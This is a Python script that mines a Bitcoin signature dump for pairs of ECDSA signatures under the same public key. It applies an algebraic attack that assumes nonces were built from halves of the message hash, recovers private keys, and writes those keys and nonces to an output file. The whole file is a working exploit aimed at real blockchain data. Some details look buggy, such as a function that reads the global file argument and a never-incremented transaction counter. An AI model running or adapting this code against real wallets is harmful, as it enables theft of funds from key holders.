#!/usr/bin/env python
import bitcoinlib
import gmpy2
import argparse

from fastecdsa.ecdsa import verify
from fastecdsa.point import Point
from fastecdsa.curve import secp256k1
from fastecdsa.point import Point
from concurrent.futures import ProcessPoolExecutor
from concurrent.futures import as_completed


signs = [(-1, -1), (-1, 1), (1, -1), (1, 1)]
mask_msb = (1 << 256) - 1
mask_lsb = (1 << 128) - 1

def compute_k(d, r, s, h):
    k = (gmpy2.invert(s, secp256k1.q) * (h + r*d)) % secp256k1.q
    return k

def recover_key_lsb(h, s, r):
    s_inv = [gmpy2.invert(s_i, secp256k1.q) for s_i in s]
    
    # Original attack
    h1_msb = h[0] >> 128
    h2_msb = h[1] >> 128
    
    # Test all the 4 sign possibilities for nonces.
    try:
        a_inv = gmpy2.invert(r[0]*s_inv[0] - r[1]*s_inv[1], secp256k1.q)
    except ZeroDivisionError:
        return None
    b = h[0]*s_inv[0] - h[1]*s_inv[1]
    for sign in signs:
        c = (sign[0] * h1_msb - sign[1] * h2_msb) << 128
        d = ((c-b) * a_inv) % secp256k1.q
        k = (sign[0] * s_inv[0] * (h[0] + r[0]*d)) % secp256k1.q
        if k >> 128 == h1_msb:
            print(hex(k))
            print(hex(h1_msb))
            break
        else:
            d = None
    return d


# Recover the key when it was used as the msb of the nonce
def recover_key_msb(h, s, r):
    s_inv = [gmpy2.invert(s_i, secp256k1.q) for s_i in s]
    h1_lsb = h[0] >> 128
    h2_lsb = h[1] >> 128

    # Test all the 4 sign possibilities for nonces.
    try:
        a_inv = gmpy2.invert(r[0]*s_inv[0] - r[1]*s_inv[1], secp256k1.q)
    except ZeroDivisionError:
        return None
    b = h[0]*s_inv[0] - h[1]*s_inv[1]
    for sign in signs:
        c = (sign[0] * h1_lsb - sign[1] * h2_lsb)
        d = ((c-b) * a_inv) % secp256k1.q
        k = (sign[0] * s_inv[0] * (h[0] + r[0]*d)) % secp256k1.q
        if k & mask_lsb == h1_lsb:
            print(hex(k))
            print(hex(h1_lsb))
            break
        else:
            d = None
    return d

def process_batch(file, begin, end):
    results = []
    h_list = []
    s_list = []
    r_list = []
    last_pubkey = None

    with open(args.file, "rb") as blockchain:
        position = begin
        blockchain.seek(begin)
        while position != end:
            l = blockchain.readline()
            if len(l) == 0:
                break
            position += len(l)
            line = l.strip()
            fields = line.split(b";")
            addr, r, s, pubkey_c, txid, message_hash, block_timestamp = fields
            r = int(r, 16)
            s = int(s, 16)
            h = int(message_hash, 16)
            
            if last_pubkey == pubkey_c:
                s_list.append(s)
                r_list.append(r)
                h_list.append(h)
                dd = recover_key_lsb(h_list, s_list, r_list)
                if dd != None:
                    pubkey = bitcoinlib.keys.Key(pubkey_c.decode(), is_private=False)
                    x = pubkey.public_point()[0]
                    y = pubkey.public_point()[1]
                    Q = Point(x, y, curve=secp256k1)
                    #print(verify((r,s), unhexlify(message_hash) , Q, secp256k1, prehashed=True))
                    print(hex(dd))
                    print(f"Found private key {hex(dd)} for: {fields}")
                    print(int(dd) * secp256k1.G == Q)
                    k1 = compute_k(dd, r_list[0], s_list[0], h_list[0])
                    k2 = compute_k(dd, r_list[1], s_list[1], h_list[1])
                    outline = f"{pubkey_c.decode()},{dd:x},{txid.decode()},{k1:x},{k2:x}\n"
                    results.append(outline)
            
            h_list = [h]
            s_list = [s]
            r_list = [r]
            last_pubkey = pubkey_c
    return results

if __name__ == "__main__":
    last_pubkey = None
    begin = 0
    end = 0
    transactions = 0
    futures = []
    executor = ProcessPoolExecutor()

    parser = argparse.ArgumentParser()
    parser.add_argument('file', type=str, help='blockchain file')
    parser.add_argument('-o', '--output', type=str, help='output file')
    parser.add_argument('-b', '--batch', type=int, \
					help='batch size')

    args = parser.parse_args()
    results_file = open(args.output, "w")
    
    with open(args.file, "rb") as blockchain:
        with executor as ex:
            eof = False
            while not eof:
                for i in range(args.batch):
                    l = blockchain.readline()
                    if len(l) == 0:
                        eof = True
                        break
                
                if not eof:
                    line = l.strip()
                    fields = line.split(b";")
                    addr, r, s, pubkey_c, txid, message_hash, block_timestamp = fields
                    last_pubkey = pubkey_c
                else:
                    break
                # Keep the same keys in the same batch.
                while last_pubkey == pubkey_c and not eof:
                    last_line = blockchain.tell()
                    l = blockchain.readline()
                    if len(l) == 0:
                        eof = True
                        break
                    line = l.strip()
                    fields = line.split(b";")
                    addr, r, s, pubkey_c, txid, message_hash, block_timestamp = fields
                    if last_pubkey != pubkey_c:
                        blockchain.seek(last_line)
                        break
                
                end = blockchain.tell()
                #results = process_batch(current_batch)
                future = ex.submit(process_batch, args.file, begin, end)
                futures.append(future)
                print(f"The batch submitted {begin}-{end}.")
                begin = end
            
        for future in as_completed(futures):
            # retrieve the results
            for l in future.result():
                results_file.write(l)

    print(f"Finished {transactions} transactions")
    results_file.close()